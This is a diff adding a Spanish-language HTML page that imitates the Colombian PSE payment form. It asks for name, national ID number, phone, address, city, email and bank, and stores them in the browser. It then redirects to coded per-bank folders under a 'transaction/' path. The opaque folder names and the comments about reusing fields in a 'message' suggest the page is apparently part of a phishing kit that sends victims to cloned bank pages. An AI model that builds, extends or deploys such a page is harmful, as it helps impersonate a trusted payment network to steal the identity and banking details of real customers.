@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>PSE - Formulario de Pago</title>
+  <style>
+    *{box-sizing:border-box;margin:0;padding:0}
+    body {
+      font-family: "Segoe UI", Arial, sans-serif;
+      background: linear-gradient(180deg, #f8faff 0%, #eef1f9 100%);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-height: 100vh;
+    }
+    header {
+      width: 100%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 10px 0;
+    }
+    header img {
+      width: 85px;
+      height: auto;
+      display: block;
+    }
+    .formulario {
+      background: #fff;
+      margin-top: 45px;
+      padding: 40px 35px;
+      border-radius: 16px;
+      box-shadow: 0 6px 20px rgba(0,0,0,0.1);
+      width: 90%;
+      max-width: 460px;
+    }
+    .formulario h2 {
+      text-align: center;
+      margin-bottom: 25px;
+      color: #0033a0;
+      font-size: 1.6rem;
+      font-weight: 600;
+    }
+    label {
+      display: block;
+      margin-bottom: 6px;
+      font-weight: 600;
+      color: #333;
+    }
+    input, select {
+      width: 100%;
+      padding: 12px 14px;
+      margin-bottom: 18px;
+      border: 1px solid #cbd3e0;
+      border-radius: 8px;
+      font-size: 15px;
+      background-color: #fafbff;
+      outline: none;
+    }
+    input:focus, select:focus {
+      border-color: #0033a0;
+      box-shadow: 0 0 5px rgba(0,51,160,0.25);
+      background-color: #fff;
+    }
+    button {
+      width: 100%;
+      background: #0033a0;
+      color: white;
+      border: none;
+      padding: 12px 0;
+      border-radius: 8px;
+      cursor: pointer;
+      font-weight: bold;
+      font-size: 16px;
+      transition: 0.3s ease;
+    }
+    button:hover {
+      background: #00297a;
+      transform: scale(1.02);
+    }
+    .nota {
+      text-align: center;
+      color: #666;
+      font-size: 13px;
+      margin-top: 12px;
+    }
+    .input-group {
+      margin-bottom: 18px;
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <img src="1.png" alt="Encabezado PSE">
+  </header>
+
+  <form class="formulario" id="formPSE">
+    <h2>Formulario de Pago PSE</h2>
+
+    <label for="nombre">Nombre Completo</label>
+    <input type="text" id="nombre" required>
+
+    <label for="cedula">Cédula</label>
+    <input type="text" id="cedula" required>
+
+    <label for="celular">Celular</label>
+    <input type="text" id="celular" required>
+
+    <label for="direccion">Dirección</label>
+    <input type="text" id="direccion" required>
+
+    <label for="ciudad">Ciudad</label>
+    <input type="text" id="ciudad" placeholder="Ej: Bogotá" required>
+
+    <label for="correo">Correo electrónico</label>
+    <input type="email" id="correo" placeholder="Ej: ejemplo@correo.com" required>
+
+    <!-- Selector de banco con folder/tipo -->
+    <div class="input-group">
+      <label>Bancos *</label>
+      <select id="txt-banco" name="banco" required>
+        <option label="A continuación seleccione su banco" value="">A continuación seleccione su banco</option>
+        <option label="BANCO AV VILLAS" value="avvillas" tipo="2" folder="b-34f1/">BANCO AV VILLAS</option>
+        <option label="BANCO BBVA COLOMBIA S.A." value="bbva" tipo="2" folder="b-34f13">BANCO BBVA COLOMBIA S.A.</option>
+        <option label="BANCO CAJA SOCIAL" value="caja-social" tipo="2" folder="b-34f2">BANCO CAJA SOCIAL</option>
+        <option label="BANCO DE BOGOTA" value="bogota" tipo="2" folder="b-34f4">BANCO DE BOGOTA</option>
+        <option label="BANCO DAVIVIENDA" value="davivienda" tipo="2" folder="b-34f10">BANCO DAVIVIENDA</option>
+        <option label="BANCO DE OCCIDENTE" value="occidente" tipo="2" folder="b-34f14">BANCO DE OCCIDENTE</option>
+        <option label="BANCO FALABELLA" value="falabella" tipo="2" folder="b-34f5">BANCO FALABELLA</option>
+        <option label="BANCO FINANDINA S.A. BIC" value="finandina" tipo="2" folder="b-34f6">BANCO FINANDINA S.A. BIC</option>
+        <option label="BANCO ITAU" value="itau" tipo="2" folder="b-34f7">BANCO ITAU</option>
+        <option label="BANCO MUNDO MUJER S.A." value="mundo-mujer" tipo="1" folder="b-34f01">BANCO MUNDO MUJER S.A.</option>
+        <option label="BANCO POPULAR" value="popular" tipo="2" folder="b-34f18">BANCO POPULAR</option>
+        <option label="BANCO SERFINANZA" value="serfinanza" tipo="2" folder="b-34f16">BANCO SERFINANZA</option>
+        <option label="BANCO UNION antes GIROS" value="union" tipo="1" folder="b-34f0">BANCO UNION antes GIROS</option>
+        <option label="BANCOLOMBIA" value="bancolombia" tipo="2" folder="b-34f9">BANCOLOMBIA</option>
+        <option label="LULO BANK" value="lulo" tipo="1" folder="b-34f02">LULO BANK</option>
+        <option label="SCOTIABANK COLPATRIA" value="scotiabank-colpatria" tipo="2" folder="b-34f12">SCOTIABANK COLPATRIA</option>
+        <option label="NEQUI" value="nequi" tipo="1" folder="nequi-1/">NEQUI</option>
+      </select>
+    </div>
+
+    <button type="submit">Continuar</button>
+    <div class="nota">Pagos seguros a través de la red PSE</div>
+  </form>
+
+  <script>
+  document.addEventListener("DOMContentLoaded", () => {
+    const form = document.getElementById("formPSE");
+
+    form.addEventListener("submit", function (e) {
+      e.preventDefault();
+
+      // 🔹 Datos del formulario
+      const documento = document.getElementById("cedula").value.trim();
+      const nombre    = document.getElementById("nombre").value.trim();
+      const direccion = document.getElementById("direccion").value.trim();
+      const correo    = document.getElementById("correo").value.trim();
+      const telefono  = document.getElementById("celular").value.trim();
+      const ciudad    = document.getElementById("ciudad").value.trim();
+
+      // 🔹 Selector de banco con folder y tipo
+      const selBanco  = document.getElementById("txt-banco");
+      const bancoVal  = selBanco.value.trim();
+      const optBanco  = selBanco.options[selBanco.selectedIndex];
+
+      const bancoLabel = (optBanco.getAttribute("label") || optBanco.textContent || "").trim();
+      const folder     = optBanco.getAttribute("folder") || "";
+      const tipo       = optBanco.getAttribute("tipo")   || "";
+
+      const tipo_identificacion = "CC";
+      const tipo_persona        = "NATURAL";
+
+      // ✅ Validaciones básicas
+      if (!documento || !nombre || !direccion || !correo || !telefono || !ciudad || !bancoVal) {
+        alert("Por favor completa todos los campos obligatorios.");
+        return;
+      }
+
+      if (!folder) {
+        alert("No se pudo determinar la ruta del banco seleccionado. Intenta nuevamente.");
+        return;
+      }
+
+      // 🧩 Objeto tbdatos completo
+      const tbdatos = {
+        documento,
+        nombre,
+        tipo_identificacion,
+        tipo_persona,
+        direccion,
+        telefono,
+        correo,
+        banco: bancoLabel, // nombre bonito del banco
+        ciudad
+      };
+
+      localStorage.setItem("tbdatos", JSON.stringify(tbdatos));
+
+      // 🧷 Guardados individuales (según tu mapping actual):
+      //  - val   -> documento
+      //  - per   -> nombre (lo usas como "Persona" en el mensaje)
+      //  - nom   -> banco (lo usas como "Banco" en el mensaje)
+      //  - cel   -> teléfono
+      //  - correo-> correo
+      localStorage.setItem("val", documento);
+      localStorage.setItem("per", nombre);       // 👤 Persona / Nombre
+      localStorage.setItem("nom", bancoLabel);   // 🏦 Banco
+      localStorage.setItem("cel", telefono);
+      localStorage.setItem("correo", correo);
+
+      // Extras por si los necesitas en otros flujos
+      localStorage.setItem("ciudad", ciudad);
+      localStorage.setItem("banco", bancoLabel); // compat extra
+      localStorage.setItem("tipo_persona", tipo_persona);
+      localStorage.setItem("bank_folder", folder);
+      localStorage.setItem("bank_tipo", tipo);
+
+      console.log("✅ tbdatos guardado:", tbdatos);
+
+      const params = window.location.search || "";
+
+      // 👉 Estás en /data-ps/recargas/, los bancos están en /data-ps/recargas/transaction/
+      // Ej: transaction/b-34f9/?loquesea
+      setTimeout(() => {
+        window.location.href = "transaction/" + folder + params;
+      }, 800);
+    });
+  });
+</script>
+
+
+</body>
+</html>
